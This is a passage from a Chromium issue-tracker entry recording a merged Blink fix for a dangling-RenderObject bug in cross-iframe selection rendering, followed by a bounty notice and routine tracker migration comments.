   A http://src.chromium.org/viewvc/blink/branches/chromium/1847/LayoutTests/editing/undo/crash-redo-with-iframes.html?r1=173049&r2=173048&pathrev=173049

Merge 171440 "Avoid using cross RenderView selection rendering"

> Avoid using cross RenderView selection rendering
> 
> This patch makes sure we pass |RenderObject| belong to RenderView in
> |RenderView::setSelection|, which takes two |RenderObject|s for start and end of
> selection, in |FrameSeleciton::updateAppearance|.
> 
> The bug is caused by |VisibleSelection::base| and |VisibleSelection::start|
> are in different document, |base| points to IFRAME and |start| points |TextNode|
> in IFRAME. This causes |RenderView|, which holds |RenderObject|s of selection
> start points and end points, have dangling |RenderObject|'s. Because,
> |RenderView| doesn't know destructed |RenderObject| belongs to another
> |RenderView|.
> 
> BUG=356690
> TEST=LayoutTests/undo/execCommand/crash-redo-with-iframes.html
> 
> Review URL: https://codereview.chromium.org/234463003

TBR=yosin@chromium.org

Review URL: https://codereview.chromium.org/261773003
-----------------------------------------------------------------

### ti...@chromium.org (2014-05-01)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-05-13)

Congrats - $1000 for this one.

### cl...@chromium.org (2014-07-22)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-07-22)

[Empty comment from Monorail migration]

### la...@google.com (2015-01-09)

Migrate from Cr-Blink-Rendering to Cr-Blink-Layout

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/356690?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40079201)*
